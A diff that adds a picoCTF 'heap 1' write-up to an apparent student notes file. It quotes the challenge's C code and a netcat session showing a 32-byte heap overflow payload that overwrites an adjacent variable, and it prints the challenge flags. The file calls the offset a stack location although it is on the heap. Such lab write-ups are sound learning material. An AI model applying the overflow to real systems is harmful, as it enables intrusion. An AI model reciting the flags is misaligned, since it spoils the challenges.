@@ -102,3 +102,97 @@ You have an integer overflow
 YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_f6ed8057}
 ```
 Our flag is `picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_f6ed8057}`
+
+# heap 1 (extra)
+Given the source code, we can observe that we need `safe_var` to be equal `"pico"` for us to get the flag
+```c
+void check_win() {
+    if (!strcmp(safe_var, "pico")) {
+        printf("\nYOU WIN\n");
+
+        // Print flag
+        char buf[FLAGSIZE_MAX];
+        FILE *fd = fopen("flag.txt", "r");
+        fgets(buf, FLAGSIZE_MAX, fd);
+        printf("%s\n", buf);
+        fflush(stdout);
+
+        exit(0);
+    } else {
+        printf("Looks like everything is still secure!\n");
+        printf("\nNo flage for you :(\n");
+        fflush(stdout);
+    }
+}
+```
+We can do so by overflowing and writing onto to the adjacent value on the heap,
+```bash
+(base) achu@air cryptonite_taskphase_2_achyuth % nc tethys.picoctf.net 61259                                            
+
+Welcome to heap1!
+I put my data on the heap so it should be safe from any tampering.
+Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.
+
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x577af24af2b0  ->   pico
++-------------+----------------+
+[*]   0x577af24af2d0  ->   bico
++-------------+----------------+
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: ^C
+(base) achu@air cryptonite_taskphase_2_achyuth % python3 
+Python 3.13.1 (main, Dec 23 2024, 20:40:06) [Clang 16.0.0 (clang-1600.0.26.4)] on darwin
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 0x577af24af2d0 - 0x577af24af2b0
+32
+>>> _ * "X"
+'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+>>> exit
+(base) achu@air cryptonite_taskphase_2_achyuth % nc tethys.picoctf.net 61259
+
+Welcome to heap1!
+I put my data on the heap so it should be safe from any tampering.
+Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.
+
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x559b41fae2b0  ->   pico
++-------------+----------------+
+[*]   0x559b41fae2d0  ->   bico
++-------------+----------------+
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 2
+Data for buffer: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXpico
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 4
+
+YOU WIN
+picoCTF{starting_to_get_the_hang_79ee3270}
+(base) achu@air cryptonite_taskphase_2_achyuth % 
+```
+We get the difference between the stack memory location to be `32`, we overflow by just the right amount such that `pico` gets placed in the next memory cell.
+Then we print it out and get the flag.
+Our flag is `picoCTF{starting_to_get_the_hang_79ee3270}`
